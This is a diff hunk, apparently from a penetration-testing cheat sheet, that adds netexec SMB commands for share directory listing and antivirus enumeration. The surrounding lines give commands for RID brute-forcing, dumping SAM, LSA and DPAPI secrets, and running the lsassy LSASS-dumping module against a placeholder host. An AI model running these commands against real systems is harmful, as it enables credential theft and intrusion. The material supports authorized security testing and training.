@@ -645,12 +645,15 @@ $ netexec smb <RHOST> -u 'guest' -p '' --shares --rid-brute | grep 'SidTypeUser'
 $ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --users
 $ netexec smb <RHOST> -u '<USERNAME>' --use-kcache --sam
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --shares <SHARE> --dir "FOLDER"
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --sam
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --lsa
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --dpapi
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --sam
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --lsa
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' --local-auth --dpapi
+$ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M enum_av
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M wcc
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M snipped
 $ netexec smb <RHOST> -u '<USERNAME>' -p '<PASSWORD>' -M lsassy
